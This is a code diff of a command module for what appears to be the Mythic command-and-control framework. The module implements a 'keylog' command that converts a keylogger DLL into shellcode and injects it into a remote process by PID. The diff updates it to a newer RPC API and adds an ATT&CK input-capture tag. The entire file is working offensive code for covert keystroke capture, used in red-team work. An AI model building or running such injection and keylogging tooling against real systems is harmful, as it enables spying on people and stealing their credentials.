@@ -1,10 +1,10 @@
-from CommandBase import *
+from mythic_payloadtype_container.MythicCommandBase import *
 import json
 from uuid import uuid4
 from os import path
 from sRDI import ShellcodeRDI
-from MythicFileRPC import *
-
+from mythic_payloadtype_container.MythicRPC import *
+import base64
 
 class KeylogArguments(TaskArguments):
 
@@ -41,7 +41,7 @@ class KeylogCommand(CommandBase):
     needs_admin = False
     help_cmd = "keylog [pid] [x64|x86]"
     description = "Start a keylogger in a remote process."
-    version = 1
+    version = 2
     is_exit = False
     is_file_browse = False
     is_process_list = False
@@ -50,20 +50,23 @@ class KeylogCommand(CommandBase):
     is_remove_file = False
     author = "@djhohnstein"
     argument_class = KeylogArguments
-    attackmapping = []
+    attackmapping = ["T1056"]
 
     async def create_tasking(self, task: MythicTask) -> MythicTask:
         task.args.add_arg("pipe_name", str(uuid4()))
         dllPath = path.join(self.agent_code_path, "Keylog_{}.dll".format(task.args.get_arg("arch")))
         dllBytes = open(dllPath, 'rb').read()
         converted_dll = ShellcodeRDI.ConvertToShellcode(dllBytes, ShellcodeRDI.HashFunctionName("InitializeNamedPipeServer"), task.args.get_arg("pipe_name").encode(), 0)
-        file_resp = await MythicFileRPC(task).register_file(converted_dll)
+        file_resp = await MythicRPC().execute("create_file",
+                                              task_id=task.id,
+                                              file=base64.b64encode(converted_dll).decode(),
+                                              delete_after_fetch=True)
         if file_resp.status == MythicStatus.Success:
-            task.args.add_arg("file_id", file_resp.agent_file_id)
+            task.args.add_arg("file_id", file_resp.response['agent_file_id'])
         else:
-            raise Exception("Failed to register keylogger DLL: " + file_resp.error_message)
+            raise Exception("Failed to register keylogger DLL: " + file_resp.error)
+        task.display_params = "Injecting keylogger into PID: {} ({})".format(task.args.get_arg("pid"), task.args.get_arg("arch"))
         task.args.remove_arg("arch")
-        
         return task
 
     async def process_response(self, response: AgentResponse):
